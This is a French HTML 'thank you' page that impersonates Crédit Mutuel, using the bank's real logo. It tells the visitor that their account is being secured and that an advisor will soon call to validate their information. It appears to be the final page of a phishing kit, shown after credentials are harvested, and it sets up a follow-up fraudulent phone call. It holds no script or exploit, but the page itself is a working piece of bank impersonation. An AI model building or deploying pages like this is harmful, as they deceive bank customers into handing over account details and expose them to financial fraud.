<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=0.8, maximum-scale=1" />
<title>Merci - Crédit Mutuel</title>
<style>
  body {
    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
    background: #f7f9fc;
    margin: 0;
    color: #0a1f47;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
  }
  header {
    background: white;
    padding: 12px 30px;
    box-shadow: 0 1px 6px rgba(0,0,0,0.1);
    display: flex;
    align-items: center;
    position: fixed;
    top: 0; left: 0; right: 0;
    z-index: 1000;
  }
  header img {
    height: 40px;
  }
  main {
    flex: 1;
    margin-top: 72px;
    max-width: 480px;
    margin-left: auto;
    margin-right: auto;
    background: white;
    border-radius: 10px;
    box-shadow: 0 4px 12px rgb(0 0 0 / 0.1);
    padding: 40px 30px;
    text-align: center;
  }
  h1 {
    font-size: 28px;
    font-weight: 700;
    margin-bottom: 24px;
  }
  p {
    font-size: 18px;
    line-height: 1.5;
  }
  footer {
    background: white;
    padding: 20px 30px;
    text-align: center;
    color: #0a1f47;
    font-weight: 600;
    font-size: 14px;
    box-shadow: 0 -1px 6px rgba(0,0,0,0.05);
  }
  @media (max-width: 480px) {
    main {
      margin: 72px 15px 20px;
      padding: 30px 20px;
    }
    h1 {
      font-size: 24px;
    }
    p {
      font-size: 16px;
    }
  }
</style>
</head>
<body>

<header>
  <img src="https://cdnsi.e-i.com/INGR/sd/cm_2023/7.122.4/fr/images/css/env/logo.svg" alt="Logo Crédit Mutuel" />
</header>

<main>
  <h1>Merci pour votre confiance</h1>
  <p>
    La sécurisation de votre compte Crédit Mutuel est en cours.<br>
    Un conseiller client vous contactera prochainement pour valider vos informations et finaliser la sécurisation.
  </p>
</main>

<footer>
  &copy; 2025 Crédit Mutuel - Une banque qui appartient à ses clients, ça change tout.
</footer>

</body>
</html>
